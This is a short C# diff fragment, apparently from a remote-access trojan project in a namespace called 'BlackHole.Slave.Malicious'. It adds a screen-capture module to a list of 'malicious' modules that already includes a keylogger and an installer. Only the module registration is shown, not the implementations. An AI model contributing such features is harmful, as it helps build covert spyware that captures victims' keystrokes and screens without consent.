@@ -21,7 +21,8 @@ namespace BlackHole.Slave.Malicious
             m_malicious = new List<IMalicious>
             {
                 Installer.Instance,
-                Keylogger.Instance
+                Keylogger.Instance,
+                ScreenCapture.Instance
             };
         }
 
